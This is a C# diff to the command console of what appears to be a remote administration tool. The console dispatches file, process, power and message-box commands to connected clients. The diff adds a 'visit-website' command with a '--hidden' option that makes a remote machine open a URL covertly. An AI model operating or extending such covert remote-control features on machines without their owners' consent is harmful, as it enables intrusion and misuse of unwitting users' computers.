@@ -206,6 +206,8 @@ namespace MasterSplinter.Cli
                 options.Text,
                 options.Button,
                 options.Icon,
+                options.Url,
+                options.Hidden,
                 options.LocalAddress,
                 options.LocalPort,
                 options.RemoteAddress,
@@ -214,7 +216,7 @@ namespace MasterSplinter.Cli
 
         public static IMessage CreateMessage(string dispatchCommand, string path)
         {
-            return CreateMessage(dispatchCommand, path, null, null, null, null, null, null, null, null, null, null, null, null);
+            return CreateMessage(dispatchCommand, path, null, null, null, null, null, null, null, null, null, false, null, null, null, null);
         }
 
         public static IMessage CreateMessage(
@@ -228,6 +230,8 @@ namespace MasterSplinter.Cli
             string text,
             string button,
             string icon,
+            string url,
+            bool hidden,
             string localAddress,
             ushort? localPort,
             string remoteAddress,
@@ -277,6 +281,12 @@ namespace MasterSplinter.Cli
                     Text = text,
                     Button = ParseMessageBoxButton(button),
                     Icon = ParseMessageBoxIcon(icon)
+                };
+            if (string.Equals(dispatchCommand, "visit-website", StringComparison.OrdinalIgnoreCase))
+                return new DoVisitWebsite
+                {
+                    Url = NormalizeWebsiteUrl(url),
+                    Hidden = hidden
                 };
             if (string.Equals(dispatchCommand, "close-connection", StringComparison.OrdinalIgnoreCase))
                 return new DoCloseConnection
@@ -329,6 +339,8 @@ namespace MasterSplinter.Cli
                 listenCommand.Text,
                 listenCommand.Button,
                 listenCommand.Icon,
+                listenCommand.Url,
+                listenCommand.Hidden,
                 listenCommand.LocalAddress,
                 listenCommand.LocalPort,
                 listenCommand.RemoteAddress,
@@ -583,6 +595,31 @@ namespace MasterSplinter.Cli
             throw new ArgumentException("--icon must be None, Error, Hand, Question, Exclamation, Warning, Information, or Asterisk.");
         }
 
+        private static string NormalizeWebsiteUrl(string url)
+        {
+            if (string.IsNullOrWhiteSpace(url))
+                throw new ArgumentException("--url is required for visit-website.");
+
+            if (url.Contains("://") &&
+                !url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
+                !url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
+            {
+                throw new ArgumentException("--url must be an HTTP or HTTPS URL.");
+            }
+
+            string normalized = url.StartsWith("http", StringComparison.OrdinalIgnoreCase)
+                ? url
+                : "http://" + url;
+
+            if (!Uri.TryCreate(normalized, UriKind.Absolute, out Uri uri) ||
+                (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps))
+            {
+                throw new ArgumentException("--url must be an HTTP or HTTPS URL.");
+            }
+
+            return uri.AbsoluteUri;
+        }
+
         private static string ResolveClientId(ClientSessionRegistry registry, string clientId)
         {
             IReadOnlyList<ClientSessionSnapshot> snapshots = registry.GetSnapshots();
@@ -613,7 +650,7 @@ namespace MasterSplinter.Cli
 
         private static void PrintListenHelp()
         {
-            Console.WriteLine("Commands: clients | dispatch <client-id|first> <command> [--path <path>] [--new-path <path>] [--type <file|directory>] [--pid <pid>] [--action <shutdown|restart|standby>] [--caption <title>] [--text <message>] [--button <button>] [--icon <icon>] [--local-address <ip>] [--local-port <port>] [--remote-address <ip>] [--remote-port <port>] [--remote-path <client-path>] [--output <local-path>] | help | exit");
+            Console.WriteLine("Commands: clients | dispatch <client-id|first> <command> [--path <path>] [--new-path <path>] [--type <file|directory>] [--pid <pid>] [--action <shutdown|restart|standby>] [--caption <title>] [--text <message>] [--button <button>] [--icon <icon>] [--url <http-url>] [--hidden] [--local-address <ip>] [--local-port <port>] [--remote-address <ip>] [--remote-port <port>] [--remote-path <client-path>] [--output <local-path>] | help | exit");
         }
 
         private static async Task ReceiveAndPrintResponseAsync(
